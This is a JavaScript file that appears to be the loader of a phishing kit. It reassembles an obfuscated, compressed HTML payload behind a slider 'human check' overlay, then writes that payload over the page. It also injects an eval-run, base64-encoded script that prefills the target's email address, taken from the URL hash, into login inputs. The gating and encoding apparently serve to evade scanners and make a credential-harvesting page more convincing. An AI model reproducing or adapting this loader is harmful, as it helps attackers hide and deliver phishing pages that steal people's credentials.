function reassemblePieces() {
  var out = '';
  try {
    for (var i = 0; i < piecesArr.length; i++) {
      var b64piece = piecesArr[i];
      var transformed = atob(b64piece);
      var rot = (transformed.length % 11);
      var chars = [];
      for (var j = 0; j < transformed.length; j++) {
        var code = (transformed.charCodeAt(j) - rot) & 0xFF;
        chars.push(String.fromCharCode(code));
      }
      out += chars.reverse().join('');
    }
    return out;
  } catch (e) {
    console.error('[Decoder] Reassembly failed:', e);
    return null;
  }
}

// --- Slider Logic ---
var handle = document.getElementById('slider-handle');
var track = document.getElementById('slider-track');
var isDragging = false;
var startX = 0;
var handleLeft = 0;

function startDrag(e) {
  isDragging = true;
  startX = e.clientX || (e.touches && e.touches[0] && e.touches[0].clientX) || 0;
  handleLeft = handle.offsetLeft;
  document.addEventListener('mousemove', drag);
  document.addEventListener('touchmove', drag);
  document.addEventListener('mouseup', stopDrag);
  document.addEventListener('touchend', stopDrag);
}

function drag(e) {
  if (!isDragging) return;
  var x = e.clientX || (e.touches && e.touches[0] && e.touches[0].clientX) || 0;
  var dx = x - startX;
  var maxLeft = track.offsetWidth - handle.offsetWidth;
  var newLeft = Math.max(0, Math.min(handleLeft + dx, maxLeft));
  handle.style.left = newLeft + 'px';
  
  if (newLeft >= maxLeft - 5) {
    stopDrag();
    triggerReconstruct();
  }
}

function stopDrag() {
  isDragging = false;
  document.removeEventListener('mousemove', drag);
  document.removeEventListener('touchmove', drag);
  document.removeEventListener('mouseup', stopDrag);
  document.removeEventListener('touchend', stopDrag);
  
  if (handle.offsetLeft < track.offsetWidth - handle.offsetWidth - 5) {
    handle.style.left = '0px';
  }
}

function triggerReconstruct() {
  var overlay = document.getElementById('human-overlay');
  if (overlay) overlay.remove();
  attemptReconstruct();
}

handle.addEventListener('mousedown', startDrag);
handle.addEventListener('touchstart', startDrag);
// -------------------

function attemptReconstruct() {
  var assembled = reassemblePieces();
  if (!assembled) {
    document.body.innerHTML = '<h2 style="color:red;text-align:center;margin-top:50px;">Reassembly failed.</h2>';
    return;
  }

  try {
    var html = LZString.decompressFromBase64(assembled);
    if (!html) throw new Error('Decompression returned null');
    
    var currentHash = window.location.hash;
    if (currentHash && currentHash.length > 1) {
      var emailValue = currentHash.substring(1);
      
      // BULLETPROOF PREFILL: Encode script to Base64 to prevent ANY escaping/syntax errors
      var prefillCode = `
        (function() {
          var emailVal = ${JSON.stringify(emailValue)};
          var nativeSetter = Object.getOwnPropertyDescriptor(window.HTMLInputElement.prototype, "value").set;
          function tryFill() {
            var selectors = 'input[type="email"], input[name*="email" i], input[id*="email" i], input[placeholder*="email" i]';
            var inputs = document.querySelectorAll(selectors);
            for (var i = 0; i < inputs.length; i++) {
              if (!inputs[i].value) {
                if (nativeSetter) { nativeSetter.call(inputs[i], emailVal); } else { inputs[i].value = emailVal; }
                inputs[i].dispatchEvent(new Event("input", { bubbles: true }));
                inputs[i].dispatchEvent(new Event("change", { bubbles: true }));
              }
            }
          }
          var attempts = 0;
          var interval = setInterval(function() {
            tryFill();
            if (++attempts > 20) clearInterval(interval);
          }, 300);
        })();
      `;
      
      var encodedPrefill = btoa(unescape(encodeURIComponent(prefillCode)));
      var prefillScript = '<script>try{eval(decodeURIComponent(escape(atob("' + encodedPrefill + '"))))}catch(e){console.error(e)}<\/script>';
      
      if (html.includes('</head>')) {
        html = html.replace('</head>', prefillScript + '</head>');
      } else if (html.includes('<body>')) {
        html = html.replace('<body>', '<body>' + prefillScript);
      } else {
        html = prefillScript + html;
      }
    }

    document.open();
    document.write(html);
    document.close();
  } catch (e) {
    console.error('[Decoder] Fatal error:', e);
    document.body.innerHTML = '<h2 style="color:red;text-align:center;margin-top:50px;">Reconstruction failed: ' + e.message + '</h2>';
  }
}
